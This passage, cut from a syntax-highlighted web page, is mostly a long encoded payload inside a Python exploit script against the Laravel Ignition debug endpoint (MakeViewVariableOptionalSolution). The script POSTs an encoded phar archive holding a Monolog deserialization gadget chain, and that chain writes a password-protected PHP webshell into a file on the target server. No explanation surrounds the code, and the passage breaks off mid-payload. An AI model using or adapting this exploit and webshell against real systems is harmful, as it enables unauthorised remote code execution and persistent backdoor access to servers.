string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">sendpayloadlinux</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=0